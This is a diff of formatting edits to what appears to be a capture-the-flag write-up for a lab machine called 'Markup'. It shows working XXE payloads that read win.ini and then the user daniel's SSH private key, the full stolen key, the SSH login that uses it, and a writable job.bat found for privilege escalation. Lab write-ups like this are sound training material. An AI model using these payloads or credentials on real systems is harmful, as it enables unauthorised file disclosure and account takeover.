@@ -75,11 +75,11 @@ Warning: OSScan results may be unreliable because we could not find at least 1 o
 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
 No OS matches for host
 Network Distance: 2 hops
-
 TRACEROUTE (using port 80/tcp)
 HOP RTT      ADDRESS
 1   75.99 ms 10.10.14.1
 2   76.22 ms 10.129.23.18
+  -
 
 ## Web Page
 
@@ -130,8 +130,8 @@ Cookie: PHPSESSID=oc1pddf95a38lmus3jrn2pj155
 Lets Try XXE - XML External Entity
 lets edit 
 <?xml version = "1.0"?>
-*<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>*
-<order>
+    *<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>*
+    <order>
         <quantity>
             1
         </quantity>
@@ -146,15 +146,14 @@ lets edit
 submit and get 
 Your order for 
             ; for 16-bit app support
-[fonts]
-[extensions]
-[mci extensions]
-[files]
-[Mail]
-MAPI=1
-[Ports]
-COM1:=9600,n,8,1
-
+    [fonts]
+    [extensions]
+    [mci extensions]
+    [files]
+    [Mail]
+    MAPI=1
+    [Ports]
+    COM1:=9600,n,8,1
          has been processed
          
 This shows that the win.init file was posted so we know it is vunlerable.
@@ -162,12 +161,13 @@ This shows that the win.init file was posted so we know it is vunlerable.
 ---
 eddit the attack to 
 
-<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
+    <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
 
 response
 
 Your order for 
-`            -----BEGIN OPENSSH PRIVATE KEY-----
+`            
+-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEArJgaPRF5S49ZB+Ql8cOhnURSOZ4nVYRSnPXo6FIe9JnhVRrdEiMi
 QZoKVCX6hIWp7I0BzN3o094nWInXYqh2oz5ijBqrn+NVlDYgGOtzQWLhW7MKsAvMpqM0fg
@@ -205,7 +205,6 @@ kUtQAh7YqWil1/jTCT0CujQGvZhxyRfXgbwE6NWZOEkqKh5+SbYuPk08kB9xboWWCEOqNE
 vRCD2pONhqZOjinGfGUMml1UaJZzxZs6F9hmOz+WAek89dPdD4rBCU2fS3J7bs9Xx2PdyA
 m3MVFR4sN7a1cAAAANZGFuaWVsQEVudGl0eQECAwQFBg==
 -----END OPENSSH PRIVATE KEY----- `
-         has been processed
          
 now we make an ssh key
 
@@ -214,13 +213,13 @@ next try ssh
 ## ssh 
 
 use the make file 
-    $ touch id_rsa
+  ` $ touch id_rsa
     $ gedit id_rsa
     past and save
     $ chmod 400 id_rsa
     $ ls -al id_rsa
     -r-------- 1 jmk jmk 2602 May 19 15:45 id_rsa
- 
+ `
  then use it 
   
     $ ssh -i id_rsa daniel@$IP
@@ -257,7 +256,8 @@ goto :eof
 echo You must run this script as an Administrator!
 :theEnd
 exit
-
+ -
+ 
 daniel@MARKUP C:\Log-Management>icacls job.bat
 job.bat BUILTIN\Users:(F)
         NT AUTHORITY\SYSTEM:(I)(F)
